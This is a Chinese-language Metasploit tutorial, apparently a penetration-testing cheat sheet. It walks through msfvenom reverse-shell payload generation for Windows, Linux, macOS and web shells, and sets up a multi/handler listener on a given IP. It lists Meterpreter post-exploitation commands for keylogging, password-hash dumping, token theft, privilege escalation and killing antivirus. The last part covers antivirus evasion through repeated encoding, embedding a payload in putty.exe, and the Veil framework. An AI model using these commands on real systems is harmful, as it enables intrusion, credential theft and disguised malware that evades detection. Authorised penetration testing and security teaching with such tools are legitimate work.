## 前言
Metasploit 是一个广泛使用的漏洞利用框架，全称为 The Metasploit Framework，简称 MSF。它之所以在全球范围内受到欢迎，不仅因为其易用性和强大功能，还因为它提供了一个可扩展的框架，允许用户开发和测试自己的漏洞脚本。

### 0x01 基本操作

#### 1. 运行
在终端中输入 `msfconsole` 启动 Metasploit 框架。

#### 2. 建立搜索缓存（数据库）
- 启动 PostgreSQL 数据库服务：`service postgresql start`，监听 5432 端口。
- 初始化 Metasploit 数据库：`msfdb init`
- 查看数据库连接状态：`msfconsole db_status`
- 重建数据库缓存：`msfconsole db_rebuild_cache`

#### 3. 专业术语
- **Exploit**：攻击工具或代码
- **Payload**：攻击载荷
- **Shellcode**：用于执行特定任务的机器码
- **Module**：模块
- **Listener**：监听器

#### 4. 常用命令
- `show exploits`：查看所有可用的渗透攻击程序代码
- `show auxiliary`：查看所有可用的辅助攻击工具
- `show options`：查看该模块的所有可用选项
- `show payloads`：查看该模块适用的所有载荷代码
- `show targets`：查看该模块适用的攻击目标类型
- `search`：根据关键字搜索某模块
- `info`：显示某模块的详细信息
- `use`：进入使用某个渗透攻击模块
- `back`：回退
- `set/unset`：设置/禁用模块中的某个参数
- `setg/unsetg`：设置/禁用适用于所有模块的全局参数
- `save`：将当前设置值保存下来，以便下次启动 MSF 终端时仍可使用

### 0x02 Metasploit 功能程序

#### `msfvenom`（攻击载荷生成和编码器）
- 主要参数：
  - `-p payload`：指定载荷
  - `-e 编码方式`：指定编码方法
  - `-i 编码次数`：指定编码次数
  - `-b 在生成的程序中避免出现的值`：避免某些字节序列
  - `LHOST, LPORT`：监听上线的主机 IP 和端口
  - `-f exe`：生成 EXE 格式
- 使用 `msfvenom -l` 可以查看可用的 payload
- 示例：`msfvenom -l | grep windows | grep x64 | grep tcp` 选择 payload

**1. 生成可执行文件**
- Linux: 
  ```sh
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
  ```
- Windows:
  ```sh
  msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
  ```
- Mac:
  ```sh
  msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho
  ```
- PHP:
  ```sh
  msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php
  ```
- ASP:
  ```sh
  msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
  ```
- JSP:
  ```sh
  msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
  ```
- WAR:
  ```sh
  msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
  ```
- Python:
  ```sh
  msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
  ```
- Bash:
  ```sh
  msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
  ```
- Perl:
  ```sh
  msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
  ```

**2. 监听**
- 设置 PAYLOAD、LHOST 和 LPORT
- `set ExitOnSession false`：保持连接，即使一个连接退出，仍然保持监听状态
- `exploit -j –z`：作为后台任务运行，不立即进行会话交换

**3. 实例**
```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=172.16.0.4 LPORT=443 -f exe > abc.exe
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(handler) > show options
msf exploit(handler) > set LHOST 172.16.0.4
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j -z
```

### 0x03 Meterpreter 后渗透
Meterpreter 提供了多种功能，包括反追踪、纯内存工作模式、系统信息获取、密码哈希导出、文件上传下载、屏幕截取、键盘记录、权限提升、跳板攻击等。

常用命令：
- `background`：放回后台
- `exit`：关闭会话
- `help`：帮助信息
- `sysinfo`：系统平台信息
- `screenshot`：屏幕截取
- `shell`：命令行 shell (exit 退出)
- `getlwd`：查看本地目录
- `lcd`：切换本地目录
- `getwd`：查看目录
- `ls`：查看文件目录列表
- `cd`：切换目录
- `rm`：删除文件
- `download C:\\Users\\123\\Desktop\\1.txt 1.txt`：下载文件
- `upload /var/www/wce.exe wce.exe`：上传文件
- `search -d c: -f *.doc`：搜索文件
- `execute -f cmd.exe -i`：执行程序/命令
- `ps`：查看进程
- `run post/windows/capture/keylog_recorder`：键盘记录
- `getuid`：查看当前用户权限
- `use priv`：加载特权模块
- `getsystem`：提升到 SYSTEM 权限
- `hashdump`：导出密码散列
- `steal_token`：窃取令牌
- `rev2self`：恢复原来的令牌
- `migrate pid`：迁移进程
- `run killav`：关闭杀毒软件
- `run getgui-e`：启用远程桌面
- `portfwd add -l 1234 -p 3389 -r`：端口转发
- `run get_local_subnets`：获取内网网段信息
- `run autoroute -s`：创建自动路由
- `run autoroute -p`：查看自动路由表

### 0x04 免杀技术

**1. 多次编码免杀**
```sh
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.80.12 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o /var/www/html/reverse_http_encode.exe
```

**2. 自定义二进制代码的文件模板免杀**
使用“putty.exe”作为文件模板，隐蔽运行并编码：
```sh
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.80.12 LPORT=443 -e x86/shikata_ga_nai -i 5 -x ~/putty.exe -k -f exe -o /var/www/html/reverse_http_putty.exe
```

**3. 使用 Veil 生成免杀代码**
- 下载地址：
  1. [Veil-Evasion](https://github.com/Veil-Framework/Veil)
- 安装：
  ```sh
  apt-get -y install git
  git clone https://github.com/Veil-Framework/Veil.git
  cd Veil/
  cd setup
  sudo ./setup.sh -c
  ```
- 运行：
  ```sh
  cd ~/Veil 
  ./Veil.py
  ```
- 使用 Veil-Evasion 工具：
  ```sh
  use Evasion
  list
  use c/meterpreter/rev_http.py
  set
  generate
  ```

通过以上步骤，您可以更好地理解和使用 Metasploit 框架及其相关工具。